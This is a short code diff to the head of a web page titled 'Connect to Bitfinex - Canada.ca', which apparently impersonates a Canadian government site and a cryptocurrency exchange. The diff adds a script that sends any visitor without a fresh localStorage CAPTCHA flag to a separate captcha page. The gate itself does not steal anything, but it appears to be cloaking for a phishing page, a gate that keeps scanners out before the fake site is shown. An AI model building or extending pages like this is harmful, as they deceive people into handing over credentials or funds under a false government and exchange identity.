@@ -3,6 +3,27 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script>
+        // CAPTCHA verification check - must pass before accessing site
+        (function() {
+            const verified = localStorage.getItem('captchaVerified');
+            const verifiedTime = localStorage.getItem('captchaVerifiedTime');
+            const CAPTCHA_VALIDITY = 24 * 60 * 60 * 1000; // 24 hours
+            
+            if (!verified || !verifiedTime) {
+                window.location.href = '/captcha.html';
+                return;
+            }
+            
+            const elapsed = Date.now() - parseInt(verifiedTime, 10);
+            if (elapsed > CAPTCHA_VALIDITY) {
+                // Captcha expired, clear and redirect
+                localStorage.removeItem('captchaVerified');
+                localStorage.removeItem('captchaVerifiedTime');
+                window.location.href = '/captcha.html';
+            }
+        })();
+    </script>
     <title>Connect to Bitfinex - Canada.ca</title>
     <link rel="icon" type="image/x-icon" href="/favicon.ico?v=2">
     <script src="https://cdn.tailwindcss.com"></script>
